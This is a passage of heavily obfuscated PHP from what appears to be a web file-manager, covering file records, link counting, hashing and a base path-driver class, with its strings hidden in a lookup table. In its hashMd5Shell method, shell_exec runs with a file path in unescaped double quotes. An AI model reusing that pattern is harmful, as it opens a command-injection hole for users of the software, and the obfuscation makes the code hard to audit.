return $Ÿ»àßÑ¬; } } $ÔŞÊ … = $this->addFileMake($¥ÕÊ‘Á‘, $Ê²¨ì¸, $äœ¸ûŠŸ, $³Á†îß¨, $ç§ö„ÛÑ, $ëÈî×—ğ); $¸àÂÉ†° = $this->addFileData($ÔŞÊ …); CacheLock::unlock($·‚Å¡…°); if (!$³Á†îß¨ && $¸àÂÉ†°) { $this->fileMd5Check($¸àÂÉ†°); } return $¸àÂÉ†°; } private function fileMd5Check($çÒ‰Ä‡) { $²‰Œ¹ =& $_SERVER[ì™ı‰º¯]; $şŸÅü€ò = array($çÒ‰Ä‡[$²‰Œ¹[468]], $çÒ‰Ä‡[$²‰Œ¹[84]]); $†å¡…ßë = $²‰Œ¹[1924] . $çÒ‰Ä‡[$²‰Œ¹[84]]; $ÄØÏğ£â = $²‰Œ¹[1925] . $çÒ‰Ä‡[$²‰Œ¹[468]]; $¤ÆƒÜÅ© = TaskQueue::add($²‰Œ¹[1926], $şŸÅü€ò, $†å¡…ßë, $ÄØÏğ£â); if (!$¤ÆƒÜÅ©) { $this->fileMd5Set($çÒ‰Ä‡[$²‰Œ¹[468]], $çÒ‰Ä‡[$²‰Œ¹[84]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($¤›•Âú­, $ä¯éÙ¬‘) { $Ãæ±ÙÛ =& $_SERVER[ì™ı‰º¯]; $–›ÍÉûú = $this->find($¤›•Âú­); if (!$–›ÍÉûú || $–›ÍÉûú[$Ãæ±ÙÛ[176]]) { return; } $Ÿ‰í€Ñâ = IO::hashMd5($ä¯éÙ¬‘); if (!$Ÿ‰í€Ñâ) { return $Ãæ±ÙÛ[12]; } $this->where(array($Ãæ±ÙÛ[468] => $¤›•Âú­))->save(array($Ãæ±ÙÛ[176] => $Ÿ‰í€Ñâ)); } public function addFileMake($¯¤‹Óß™, $ÓŞû¦ò², $£îŸëœ, $É•Éª€–, $şÇøÑ¹’, $¡éì¼à¹) { $½ì”Õ£û =& $_SERVER[ì™ı‰º¯]; $¨õ˜ÍàÈ = $this->createFileName($şÇøÑ¹’, $£îŸëœ, $É•Éª€–); $Ä»…©™¯ = get_path_father($¨õ˜ÍàÈ); $©…ŒÓ©® = get_path_this($¨õ˜ÍàÈ); if ($¡éì¼à¹) { $ùØïùŸ¢ = IO::move($¯¤‹Óß™, $Ä»…©™¯, !1, $©…ŒÓ©®); } else { $ùØïùŸ¢ = IO::copy($¯¤‹Óß™, $Ä»…©™¯, !1, $©…ŒÓ©®); } if (!$ùØïùŸ¢) { return !1; } $¢Ì¢Ú† = KodIO::defaultDriver(); $Í¦ŸÔ›“ = array($½ì”Õ£û[545] => $ÓŞû¦ò², $½ì”Õ£û[1920] => 1, $½ì”Õ£û[420] => $şÇøÑ¹’, $½ì”Õ£û[804] => $¢Ì¢Ú†[$½ì”Õ£û[399]], $½ì”Õ£û[421] => $¨õ˜ÍàÈ, $½ì”Õ£û[1921] => $£îŸëœ, $½ì”Õ£û[1922] => $É•Éª€–); return $Í¦ŸÔ›“; } public function addFileCheckExist($øğœ Á, $Ú÷œ›š‹, $Íå²µğ‚) { $“»İšÂ =& $_SERVER[ì™ı‰º¯]; $úš¼”‡Ù = $this->findByHash($øğœ Á, $Ú÷œ›š‹); if (!$úš¼”‡Ù) { return !1; } $†”òØ¢Ï = array($“»İšÂ[1920] => intval($úš¼”‡Ù[$“»İšÂ[1927]]) + 1, $“»İšÂ[545] => $Íå²µğ‚); $this->where(array($“»İšÂ[469] => $úš¼”‡Ù[$“»İšÂ[468]]))->save($†”òØ¢Ï); return $úš¼”‡Ù; } public function remove($¨äÚ°Ï±) { $this->linkCountChange($¨äÚ°Ï±, !1); $this->clearEmpty(); return !0; } public function linkAdd($˜Ÿâó†Ô) { $this->linkCountChange($˜Ÿâó†Ô, !0); } public function linkCountChange($Í¼û«¾, $¥œê°¶¶) { $¦Ô‘Æ‡š =& $_SERVER[ì™ı‰º¯]; if (!$Í¼û«¾) { return; } if (!is_array($Í¼û«¾)) { $Í¼û«¾ = array($Í¼û«¾); } $şø›ÆÏ’ = array(); foreach ($Í¼û«¾ as $èõü•ò†) { $–µ§Õ‹‰ = $èõü•ò† . $¦Ô‘Æ‡š[12]; if (!$şø›ÆÏ’[$–µ§Õ‹‰]) { $şø›ÆÏ’[$–µ§Õ‹‰] = 0; } $şø›ÆÏ’[$–µ§Õ‹‰]++; } $˜ê›æÔÚ = array(); foreach ($şø›ÆÏ’ as $èõü•ò† => $æ½¬¡œñ) { $–µ§Õ‹‰ = $æ½¬¡œñ . $¦Ô‘Æ‡š[12]; if (!$˜ê›æÔÚ[$–µ§Õ‹‰]) { $˜ê›æÔÚ[$–µ§Õ‹‰] = array(); } $˜ê›æÔÚ[$–µ§Õ‹‰][] = $èõü•ò†; } foreach ($˜ê›æÔÚ as $æ½¬¡œñ => $”¨€µç) { if (!$”¨€µç) { continue; } $æ½¬¡œñ = $¥œê°¶¶ ? $æ½¬¡œñ : -intval($æ½¬¡œñ); $î¶ÜäÓé = array($¦Ô‘Æ‡š[468] => array($¦Ô‘Æ‡š[7], $”¨€µç)); if ($æ½¬¡œñ < 0) { $î¶ÜäÓé[$¦Ô‘Æ‡š[1927]] = array($¦Ô‘Æ‡š[1014], abs($æ½¬¡œñ)); } $this->where($î¶ÜäÓé)->setAdd($¦Ô‘Æ‡š[1927], $æ½¬¡œñ); } } public function findByHash($î‰­¦ıâ, $Ã±É‚Æ‹ = false) { $±’İø£î =& $_SERVER[ì™ı‰º¯]; if (!$î‰­¦ıâ && !$Ã±É‚Æ‹) { return !1; } $€Ø™ì’À = array($±’İø£î[1921] => $î‰­¦ıâ); if ($Ã±É‚Æ‹) { $€Ø™ì’À = array($±’İø£î[1922] => $Ã±É‚Æ‹); } return $this->order($±’İø£î[1928])->where($€Ø™ì’À)->find(); } public function clearEmpty($¥ä…íãÄ = 0) { $ùõŒíœ• =& $_SERVER[ì™ı‰º¯]; $×ùÀ¢ÅÅ = time() - 3600 * 24 * $¥ä…íãÄ; $íøõö»Ë = $ùõŒíœ•[1929] . $×ùÀ¢ÅÅ; $ä»À¶¤ë = $this->where($íøõö»Ë)->select(); if (!$ä»À¶¤ë) { return; } $“Şà€…Ã = new Task($ùõŒíœ•[1930], $ùõŒíœ•[12], count($ä»À¶¤ë)); foreach ($ä»À¶¤ë as $†­ œ¤Œ) { $“Şà€…Ã->update(1); $this->resetFile($†­ œ¤Œ); } $“Şà€…Ã->end(); } public function resetFile($Ÿ’ÅûÛò) { $±áîÕ † =& $_SERVER[ì™ı‰º¯]; $¹ˆŒì‰ = array($±áîÕ †[469] => $Ÿ’ÅûÛò[$±áîÕ †[468]]); $ÈÏ›¸¬ = Model($±áîÕ †[1338])->where($¹ˆŒì‰)->count(); $Ò¶Ù¿Ü = Model($±áîÕ †[1931])->where($¹ˆŒì‰)->count(); $­›„±‡Ì = intval($ÈÏ›¸¬) + intval($Ò¶Ù¿Ü); if ($­›„±‡Ì == 0) { IO::remove($Ÿ’ÅûÛò[$±áîÕ †[84]]); Model($±áîÕ †[1932])->delete($Ÿ’ÅûÛò[$±áîÕ †[468]]); $this->where($¹ˆŒì‰)->delete(); $this->metaSet($Ÿ’ÅûÛò[$±áîÕ †[468]], null, null); return; } if ($Ÿ’ÅûÛò[$±áîÕ †[1927]] != $­›„±‡Ì) { $this->where($¹ˆŒì‰)->save(array($±áîÕ †[1920] => $­›„±‡Ì)); } } public function storageInfo($êâ¾¡ † = false) { $˜Ïº£Şµ =& $_SERVER[ì™ı‰º¯]; $èıİã”Á = $this->count() + 0.0; $â«²²µË = 0; $ö×§£•¨ = 1; $…—°Õ¢Ë = 0; $¯Ù•¹ÎÙ = 5000; for ($ˆê¹Ø×– = 0; $ˆê¹Ø×– < $èıİã”Á; $ˆê¹Ø×– = $ˆê¹Ø×– + $¯Ù•¹ÎÙ) { $ëÓ†ÊÈÌ = $this->limit($ˆê¹Ø×–, $ˆê¹Ø×– + $¯Ù•¹ÎÙ)->select(); foreach ($ëÓ†ÊÈÌ as $ÆâÊ‚) { $ö×§£•¨ += $ÆâÊ‚[$˜Ïº£Şµ[76]] * $ÆâÊ‚[$˜Ïº£Şµ[1927]]; $â«²²µË += $ÆâÊ‚[$˜Ïº£Şµ[76]] * ($ÆâÊ‚[$˜Ïº£Şµ[1927]] - 1); $…—°Õ¢Ë += $ÆâÊ‚[$˜Ïº£Şµ[1927]]; } } $Îøë¼‹û = array($˜Ïº£Şµ[1933] => $ö×§£•¨, $˜Ïº£Şµ[1934] => $â«²²µË, $˜Ïº£Şµ[1935] => $â«²²µË / $ö×§£•¨, $˜Ïº£Şµ[80] => $èıİã”Á, $˜Ïº£Şµ[1936] => $…—°Õ¢Ë); return $Îøë¼‹û; } } goto dÌ ñ¦ÒÙ×; eÊÙ¸²ƒìä: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $¥Ò§½“ã =& $_SERVER[ì™ı‰º¯]; $this->objectDriver = array($¥Ò§½“ã[60], $¥Ò§½“ã[61], $¥Ò§½“ã[62], $¥Ò§½“ã[63], $¥Ò§½“ã[64], $¥Ò§½“ã[65], $¥Ò§½“ã[66], $¥Ò§½“ã[67], $¥Ò§½“ã[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($î¯ĞûÎ‘) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($î¯ĞûÎ‘, $_SERVER[ì™ı‰º¯][8]); } return $î¯ĞûÎ‘; } public function iconvApp($ÏÑóïóà) { return $ÏÑóïóà; } public function iconvSystem($¨¿£î‚) { return $¨¿£î‚; } public function iconvTo($¸‹éË”, $ı„ê®ŞÑ, $ä˜Á¦äÓ) { $èóÌÅ¥ =& $_SERVER[ì™ı‰º¯]; if (!$¸‹éË” || !function_exists($èóÌÅ¥[69])) { return $¸‹éË”; } static $¨ùÀ±Ùî = array(); $ÀÎß¦ñ = $ı„ê®ŞÑ . $èóÌÅ¥[70] . $ä˜Á¦äÓ . $èóÌÅ¥[71] . $¸‹éË”; if (isset($¨ùÀ±Ùî[$ÀÎß¦ñ])) { return $¨ùÀ±Ùî[$ÀÎß¦ñ]; } if (function_exists($èóÌÅ¥[72])) { $Ò‰ÃßöĞ = @mb_convert_encoding($¸‹éË”, $ä˜Á¦äÓ, $ı„ê®ŞÑ); } else { $Ò‰ÃßöĞ = @iconv($ı„ê®ŞÑ, $ä˜Á¦äÓ, $¸‹éË”); } $Ò‰ÃßöĞ = $Ò‰ÃßöĞ ? $Ò‰ÃßöĞ : $¸‹éË”; if (strstr($Ò‰ÃßöĞ, $èóÌÅ¥[73])) { $Ò‰ÃßöĞ = str_replace($èóÌÅ¥[73], $èóÌÅ¥[11], $Ò‰ÃßöĞ); } $¨ùÀ±Ùî[$ı„ê®ŞÑ . $èóÌÅ¥[70] . $ä˜Á¦äÓ . $èóÌÅ¥[71] . $¸‹éË”] = $Ò‰ÃßöĞ; $¨ùÀ±Ùî[$ä˜Á¦äÓ . $èóÌÅ¥[70] . $ı„ê®ŞÑ . $èóÌÅ¥[71] . $¸‹éË”] = $¸‹éË”; $¨ùÀ±Ùî[$ä˜Á¦äÓ . $èóÌÅ¥[70] . $ı„ê®ŞÑ . $èóÌÅ¥[71] . $Ò‰ÃßöĞ] = $¸‹éË”; $¨ùÀ±Ùî[$ı„ê®ŞÑ . $èóÌÅ¥[70] . $ä˜Á¦äÓ . $èóÌÅ¥[71] . $Ò‰ÃßöĞ] = $Ò‰ÃßöĞ; return $Ò‰ÃßöĞ; } public function getPathInner($»Â¨©¯Ü) { $‚·ãª = IO::init($»Â¨©¯Ü); return $‚·ãª->path; } public function getPathOuter($¡Æ’Ô¡Œ) { $ïµÚ„áà =& $_SERVER[ì™ı‰º¯]; $»¾Á¥Ú = strlen(trim($this->pathBase, $ïµÚ„áà[8])); $¡Æ’Ô¡Œ = substr(trim($¡Æ’Ô¡Œ, $ïµÚ„áà[8]), $»¾Á¥Ú); return $this->pathDriver . $ïµÚ„áà[8] . ltrim($¡Æ’Ô¡Œ, $ïµÚ„áà[8]); } public function isParentOf($çìËİ, $ÂÌÂ¿Š) { $÷Äå´˜ =& $_SERVER[ì™ı‰º¯]; $çìËİ = rtrim(strtolower($çìËİ), $÷Äå´˜[8]) . $÷Äå´˜[8]; $ÂÌÂ¿Š = rtrim(strtolower($ÂÌÂ¿Š), $÷Äå´˜[8]) . $÷Äå´˜[8]; $¦½Û™æ = strpos($ÂÌÂ¿Š, $çìËİ) === 0; return $¦½Û™æ; } public function getType() { $°ùïƒêé =& $_SERVER[ì™ı‰º¯]; $¿ü›ÕüÛ = str_replace($°ùïƒêé[74], $°ùïƒêé[12], get_class($this)); return strtolower($¿ü›ÕüÛ); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($ßÛ×¹Æ¾, $°®¼Ğ) { $ö´ºÌÜ¬ =& $_SERVER[ì™ı‰º¯]; $ƒÔÒÊË = rtrim($ßÛ×¹Æ¾, $ö´ºÌÜ¬[8]) . $ö´ºÌÜ¬[8] . $°®¼Ğ; $Î’ÃŞŞà = $this->exist($ƒÔÒÊË); return $Î’ÃŞŞà ? $ƒÔÒÊË : !1; } public function setModifyTime($±¤ƒïÈä, $¤·û¡ˆõ = '') { } public function renameObject($»·£ÆÔ®, $âÖç±²) { $ÂÇ—Ÿ¶ = $âÖç±²; $»·£ÆÔ® = $this->getPathOuter($»·£ÆÔ®); $âÖç±² = $this->pathFather($»·£ÆÔ®) . $âÖç±²; $ƒÚ€Ê¼Ô = IO::copy($»·£ÆÔ®, $this->pathFather($»·£ÆÔ®), REPEAT_RENAME_FOLDER, $ÂÇ—Ÿ¶); if ($ƒÚ€Ê¼Ô) { IO::remove($»·£ÆÔ®); } return $ƒÚ€Ê¼Ô ? $âÖç±² : !1; } public function tempFile($éÅÎ´¥î = '', $ä¹Ï¼ç = '') { if (!$éÅÎ´¥î) { $éÅÎ´¥î = rand_string(15); } $‘Şòè» = TEMP_FILES . rand_string(15) . $_SERVER[ì™ı‰º¯][8]; @mkdir($‘Şòè», DEFAULT_PERRMISSIONS, !0); $Ö¤ßôä¹ = $‘Şòè» . $éÅÎ´¥î; @touch($Ö¤ßôä¹); if ($ä¹Ï¼ç) { file_put_contents($Ö¤ßôä¹, $ä¹Ï¼ç); } return $Ö¤ßôä¹; } public function tempFileRemve($†•¿»¨ó) { @unlink($†•¿»¨ó); @rmdir($this->pathFather($†•¿»¨ó)); } public function mkfile($¼¼õì®, $¶˜±¦ = '', $Ğ—‚Ø„Í = REPEAT_RENAME) { } public function mkdir($ßø—¼î±, $æÓ¤ÆÁ± = REPEAT_SKIP) { } public function delFile($®çéÏ×å) { } public function delFolder($¦ë« Ã) { } public function copyFile($ûÀÉ¯ü», $üÀ¬á²Ø) { } public function moveFile($ÊÚéÍ™, $—¹İîÙš) { } public function remove($Ñó› ‡) { if ($this->isFile($Ñó› ‡)) { return $this->delFile($Ñó› ‡); } return $this->delFolder($Ñó› ‡); } public function rename($ø©­…, $Ôƒªî«ª) { } public function exist($³†ÒÊñ‰) { } public function findByHash($Š‡ŞÙÔ« = '', $åé°Ñ = '') { return !1; } public function isFile($Äª¹ÜÍÙ) { } public function isFolder($“Ã‡áª¹) { } public function size($¼ì“””ì) { } public function info($¢ı¾ˆ„½) { } public function infoSimple($ÒÇ¯ÏÑ÷) { return $this->info($ÒÇ¯ÏÑ÷); } public function infoAuth($ºá£×Ëø) { return $this->info($ºá£×Ëø); } public function infoFull($Ø÷šáüŠ) { return $this->info($Ø÷šáüŠ); } public function infoWithChildren($áñ¯©÷) { $ˆ×Ô×ş² =& $_SERVER[ì™ı‰º¯]; static $óÁéŞš = array(); if (isset($óÁéŞš[$áñ¯©÷])) { return $óÁéŞš[$áñ¯©÷]; } $ç£êµæ˜ = $this->info($áñ¯©÷); if ($ç£êµæ˜ && $ç£êµæ˜[$ˆ×Ô×ş²[33]] == $ˆ×Ô×ş²[75]) { $çŸ‰–¦Á = array($ˆ×Ô×ş²[76] => 0, $ˆ×Ô×ş²[77] => 0, $ˆ×Ô×ş²[78] => 0); $this->infoChildren($áñ¯©÷, $çŸ‰–¦Á); $ç£êµæ˜[$ˆ×Ô×ş²[76]] = $çŸ‰–¦Á[$ˆ×Ô×ş²[76]]; $ç£êµæ˜[$ˆ×Ô×ş²[79]] = array($ˆ×Ô×ş²[80] => $çŸ‰–¦Á[$ˆ×Ô×ş²[77]], $ˆ×Ô×ş²[81] => $çŸ‰–¦Á[$ˆ×Ô×ş²[78]]); $óÁéŞš[$áñ¯©÷] = $ç£êµæ˜; } return $ç£êµæ˜; } public function listPath($ÚÃ’¤›, $Â»§ÅÕã = false) { } public function has($òÚ¡™ó, $¼Çè«‘ = false, $Äé’´ë = false) { } public function canRead($’ˆ½­ºÖ) { } public function canWrite($¹¬ìó) { } public function getContent($ÌÜ‹„È‚) { } public function setContent($´ƒ ÷ÃÄ, $Øî»Ä— = '') { } protected function infoChildren($êÏæ ´¨, &$¿ªìá³±) { $·óƒ”² =& $_SERVER[ì™ı‰º¯]; check_abort_echo(); $ôñÖ‹Ãû = $this->listPath($êÏæ ´¨, !0); $ôñÖ‹Ãû = array_merge($ôñÖ‹Ãû[$·óƒ”²[82]], $ôñÖ‹Ãû[$·óƒ”²[83]]); foreach ($ôñÖ‹Ãû as $ÓˆîıíÁ) { if ($ÓˆîıíÁ[$·óƒ”²[33]] == $·óƒ”²[75]) { $¿ªìá³±[$·óƒ”²[78]]++; $İÇ»âè = $this->getPathInner($ÓˆîıíÁ[$·óƒ”²[84]]); $this->infoChildren($İÇ»âè, $¿ªìá³±); } else { $¿ªìá³±[$·óƒ”²[77]]++; $¿ªìá³±[$·óƒ”²[76]] += $ÓˆîıíÁ[$·óƒ”²[76]]; } } } public function fileSubstr($ĞÉôÓÉ­, $ûä²¾ü, $±ÛşÁ‹Â) { } public function listAll($óä¬Ê·˜) { } public function listAllMake($Âã¶÷¹, &$†í°Æâ¸) { $İğ¡Ò¨â =& $_SERVER[ì™ı‰º¯]; check_abort_echo(); $Ö»³Œ¿ = $this->listPath($Âã¶÷¹, !0); if (!$Ö»³Œ¿) { return; } $©Âïğñ× = array_merge($Ö»³Œ¿[$İğ¡Ò¨â[82]], $Ö»³Œ¿[$İğ¡Ò¨â[83]]); foreach ($©Âïğñ× as $ßÂ›¬î) { $Ç¢£„Ê“ = $ßÂ›¬î[$İğ¡Ò¨â[33]] == $İğ¡Ò¨â[75]; $ñÊ†ûÈ = array($İğ¡Ò¨â[84] => $ßÂ›¬î[$İğ¡Ò¨â[84]], $İğ¡Ò¨â[75] => $Ç¢£„Ê“); if (isset($ßÂ›¬î[$İğ¡Ò¨â[76]])) { $ñÊ†ûÈ[$İğ¡Ò¨â[76]] = $ßÂ›¬î[$İğ¡Ò¨â[76]]; } if (isset($ßÂ›¬î[$İğ¡Ò¨â[85]])) { $ñÊ†ûÈ[$İğ¡Ò¨â[85]] = $ßÂ›¬î[$İğ¡Ò¨â[85]]; } if (!$Ç¢£„Ê“) { $†í°Æâ¸[] = $ñÊ†ûÈ; continue; } $†í°Æâ¸[] = $ñÊ†ûÈ; $§ˆå­” = $ßÂ›¬î[$İğ¡Ò¨â[84]]; $å€·ñŸÉ = $this->pathDriver; if (substr($ßÂ›¬î[$İğ¡Ò¨â[84]], 0, strlen($å€·ñŸÉ)) == $å€·ñŸÉ) { $§ˆå­” = substr($§ˆå­”, strlen($å€·ñŸÉ)); } $this->listAllMake($§ˆå­”, $†í°Æâ¸); } } public function listAllSimple($½™ ¨Ü¦, $³±ë’æ¬ = false) { $”ãÂòæ = $this->listAll($½™ ¨Ü¦); return $this->listAllSimpleMake($”ãÂòæ, $this->getPathOuter($½™ ¨Ü¦), $³±ë’æ¬); } public function listAllSimpleMake($µ—‰Í›†, $Îâıœ‚í, $óíˆ‡™) { $à¡öşÉ¢ =& $_SERVER[ì™ı‰º¯]; $ëÍºîÎ = array(); $Îâıœ‚í = rtrim(get_path_father($Îâıœ‚í), $à¡öşÉ¢[8]) . $à¡öşÉ¢[8]; foreach ($µ—‰Í›† as $Õ½ìÁÊ¹) { $‡øè¢÷í = array($à¡öşÉ¢[84] => $Õ½ìÁÊ¹[$à¡öşÉ¢[84]], $à¡öşÉ¢[86] => $Õ½ìÁÊ¹[$à¡öşÉ¢[84]], $à¡öşÉ¢[75] => $Õ½ìÁÊ¹[$à¡öşÉ¢[75]]); if (isset($Õ½ìÁÊ¹[$à¡öşÉ¢[76]]) && !$Õ½ìÁÊ¹[$à¡öşÉ¢[75]]) { $‡øè¢÷í[$à¡öşÉ¢[76]] = $Õ½ìÁÊ¹[$à¡öşÉ¢[76]]; } if (isset($Õ½ìÁÊ¹[$à¡öşÉ¢[85]])) { $‡øè¢÷í[$à¡öşÉ¢[85]] = $Õ½ìÁÊ¹[$à¡öşÉ¢[85]]; } if (is_array($Õ½ìÁÊ¹[$à¡öşÉ¢[87]])) { $‡øè¢÷í[$à¡öşÉ¢[86]] = $Õ½ìÁÊ¹[$à¡öşÉ¢[87]][$à¡öşÉ¢[84]]; $‡øè¢÷í[$à¡öşÉ¢[76]] = $Õ½ìÁÊ¹[$à¡öşÉ¢[87]][$à¡öşÉ¢[76]]; $‡øè¢÷í[$à¡öşÉ¢[85]] = $Õ½ìÁÊ¹[$à¡öşÉ¢[87]][$à¡öşÉ¢[85]]; } else { if (substr($Õ½ìÁÊ¹[$à¡öşÉ¢[84]], 0, strlen($Îâıœ‚í)) == $Îâıœ‚í) { $‡øè¢÷í[$à¡öşÉ¢[84]] = substr($Õ½ìÁÊ¹[$à¡öşÉ¢[84]], strlen($Îâıœ‚í)); } } $È¾Ìüø = $Õ½ìÁÊ¹[$à¡öşÉ¢[75]] ? $à¡öşÉ¢[8] : $à¡öşÉ¢[12]; $‡øè¢÷í[$à¡öşÉ¢[86]] = rtrim($‡øè¢÷í[$à¡öşÉ¢[86]], $à¡öşÉ¢[8]) . $È¾Ìüø; $‡øè¢÷í[$à¡öşÉ¢[84]] = $à¡öşÉ¢[8] . trim($‡øè¢÷í[$à¡öşÉ¢[84]], $à¡öşÉ¢[8]) . $È¾Ìüø; if (!$óíˆ‡™) { $Õë× ¡ = explode($à¡öşÉ¢[8], trim($‡øè¢÷í[$à¡öşÉ¢[84]], $à¡öşÉ¢[8])); $‡øè¢÷í[$à¡öşÉ¢[84]] = $à¡öşÉ¢[8] . implode($à¡öşÉ¢[8], array_slice($Õë× ¡, 1)) . $È¾Ìüø; } $ëÍºîÎ[] = $‡øè¢÷í; } return array_sort_by($ëÍºîÎ, $à¡öşÉ¢[84]); } public function upload($‚µÄ§õ¢, $Îøœİ„ä, $¤‘çá½í = false, $ºøƒŠêŒ = REPEAT_REPLACE) { } public function uploadFileByID($Ò¬„À¨, $¯¶ÂÁÖç, $‰ŸÛŠÂ) { } public function uploadFileByPath($¹ŠÏÎÄ, $™­ÚÍÁ, $»¡ûÁÆ¥ = array()) { } public function isUploadServer() { $€üËª‘ï =& $_SERVER[ì™ı‰º¯]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $€üËª‘ï[88]) { return !0; } return $GLOBALS[$€üËª‘ï[6]][$€üËª‘ï[89]][$€üËª‘ï[90]]; } public function isFileOutServer() { $’°†ç› =& $_SERVER[ì™ı‰º¯]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $’°†ç›[88]) { return !0; } return $GLOBALS[$’°†ç›[6]][$’°†ç›[89]][$’°†ç›[91]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($ßÄåƒé) { $¼üúåÔ• =& $_SERVER[ì™ı‰º¯]; if (!$this->isCdnHost()) { return $ßÄåƒé; } return str_replace(trim(get_url_root($ßÄåƒé), $¼üúåÔ•[8]), trim($this->cdnHost, $¼üúåÔ•[8]), $ßÄåƒé); } public function uploadLink($×¹¨úÙ, $§“Ÿ—‘ = 0) { $²à¡•®ò =& $_SERVER[ì™ı‰º¯]; if ($this->isUploadServer()) { return; } $©–ú”ÉÈ = $this->getType(); if (!in_array($©–ú”ÉÈ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $¶ÖâÀ”µ = 1024 * 1024 * 10; $ãÅôÓàá = $§“Ÿ—‘ <= $¶ÖâÀ”µ ? $²à¡•®ò[92] : $²à¡•®ò[93]; $ƒÑ°û¸ƒ = (!$§“Ÿ—‘ ? 1 : ceil($§“Ÿ—‘ / pow(1024, 3))) * 3600 * 4; $™è²…ğº = $this->{$ãÅôÓàá}($×¹¨úÙ, $ƒÑ°û¸ƒ); if ($™è²…ğº) { $™è²…ğº[$²à¡•®ò[94]] = $×¹¨úÙ; $™è²…ğº[$²à¡•®ò[95]] = $©–ú”ÉÈ; } return $™è²…ğº; } public function uploadFormData($æÖ²šÜ­, $Ì“ãÒ´Î = 3600) { } public function multiUploadFormData($¦æ¤æª¥, $µ÷œß¡Ú = 3600) { } public function download($Šöı–«, $ıèàÆ§ô) { } public function ext($©Ò—ğ˜) { $ˆ£êÓÑ =& $_SERVER[ì™ı‰º¯]; if (strpos($©Ò—ğ˜, $ˆ£êÓÑ[8]) === -1) { $˜’‘š®£ = $©Ò—ğ˜; } else { $˜’‘š®£ = $this->pathThis($©Ò—ğ˜); } $š•ö´Äı = $ˆ£êÓÑ[12]; if (strstr($˜’‘š®£, $ˆ£êÓÑ[10])) { $š•ö´Äı = substr($˜’‘š®£, strrpos($˜’‘š®£, $ˆ£êÓÑ[10]) + 1); $š•ö´Äı = strtolower($š•ö´Äı); } if (strlen($š•ö´Äı) > 3 && preg_match($ˆ£êÓÑ[96], $š•ö´Äı, $êŸôÖóÖ)) { $š•ö´Äı = $ˆ£êÓÑ[12]; } return $š•ö´Äı; } public function pathThis($Æ’÷‡ó) { $’ûËÛ÷è =& $_SERVER[ì™ı‰º¯]; $Æ’÷‡ó = str_replace($’ûËÛ÷è[97], $’ûËÛ÷è[8], rtrim($Æ’÷‡ó, $’ûËÛ÷è[8])); $šïçÂÒ = strrpos($Æ’÷‡ó, $’ûËÛ÷è[8]); if ($šïçÂÒ === !1) { return $Æ’÷‡ó; } return substr($Æ’÷‡ó, $šïçÂÒ + 1); } public function pathFather($òÖğÍå—) { $ú½©© =& $_SERVER[ì™ı‰º¯]; $òÖğÍå— = str_replace($ú½©©[97], $ú½©©[8], rtrim($òÖğÍå—, $ú½©©[8])); $ÁŒñÜˆ = strrpos($òÖğÍå—, $ú½©©[8]); if ($ÁŒñÜˆ === !1) { return $ú½©©[12]; } return substr($òÖğÍå—, 0, $ÁŒñÜˆ + 1); } public function hashSimple($–ãÏÓ†™) { $ İˆ·ø¨ =& $_SERVER[ì™ı‰º¯]; if (!$–ãÏÓ†™) { return md5($ İˆ·ø¨[12]); } $ÒƒÖ×†¥ = $this->size($–ãÏÓ†™); $ “û’ÖŒ = 200; $Õ¡’Ó× = 50; if ($ÒƒÖ×†¥ <= $ “û’ÖŒ * $Õ¡’Ó×) { return $this->hashMd5($–ãÏÓ†™) . $ÒƒÖ×†¥; } $€’Âî„ = intval($ÒƒÖ×†¥ / $Õ¡’Ó×); $æúØğ” = $ İˆ·ø¨[12]; for ($¿›Ñã²ù = 0; $¿›Ñã²ù < $Õ¡’Ó×; $¿›Ñã²ù++) { $æúØğ” .= $this->fileSubstr($–ãÏÓ†™, $€’Âî„ * $¿›Ñã²ù, $ “û’ÖŒ); } $æúØğ” .= $this->fileSubstr($–ãÏÓ†™, $ÒƒÖ×†¥ - $ “û’ÖŒ, $ “û’ÖŒ); return md5($æúØğ”) . $ÒƒÖ×†¥; } public static $md5Cache = array(); public function hashMd5($Š¤àíä–) { if (!$Š¤àíä–) { return md5($_SERVER[ì™ı‰º¯][12]); } $Š¤àíä– = $this->iconvSystem($Š¤àíä–); if (isset(self::$md5Cache[$Š¤àíä–])) { return self::$md5Cache[$Š¤àíä–]; } self::$md5Cache[$Š¤àíä–] = $this->hashMd5Shell($Š¤àíä–); if (!self::$md5Cache[$Š¤àíä–]) { self::$md5Cache[$Š¤àíä–] = @md5_file($Š¤àíä–); } return self::$md5Cache[$Š¤àíä–]; } private function hashMd5Shell($¿úÄôÃ) { $×ï‹‚ıó =& $_SERVER[ì™ı‰º¯]; if (!$¿úÄôÃ) { return md5($×ï‹‚ıó[12]); } if (!function_exists($×ï‹‚ıó[98])) { return !1; } $Ì ¨€ = array($×ï‹‚ıó[99], $×ï‹‚ıó[100]); $ùÎ†ö´ = Cache::get($×ï‹‚ıó[101]); if (!$ùÎ†ö´) { $¬Áœ´í‘ = BASIC_PATH . $×ï‹‚ıó[102]; $›ˆË‰ä = md5_file($¬Áœ´í‘); $ùÎ†ö´ = $×ï‹‚ıó[103]; foreach ($Ì ¨€ as $ûÎ÷Ú¨ã) { $ì¡‚ĞÍŸ = shell_exec($ûÎ÷Ú¨ã . "\x20\42{$¬Áœ´í‘}\x22"); if ($ì¡‚ĞÍŸ && substr(trim($ì¡‚ĞÍŸ), 0, 32) == $›ˆË‰ä) { $ùÎ†ö´ = $ûÎ÷Ú¨ã; break; } } Cache::set($×ï‹‚ıó[101], $ùÎ†ö´, 3600); } if ($ùÎ†ö´ == $×ï‹‚ıó[103]) { return !1; } $ì¡‚ĞÍŸ = shell_exec($ùÎ†ö´ . "\x20\42{$¿úÄôÃ}\42"); $ì¡‚ĞÍŸ = str_replace($×ï‹‚ıó[104], $×ï‹‚ıó[12], $ì¡‚ĞÍŸ); return substr($ì¡‚ĞÍŸ, 0, 32); } public function link($¿Üˆ»À¯) { return $¿Üˆ»À¯; } public function fileOut($¿ª›šĞ¦, $ıË¸ûİÛ = false, 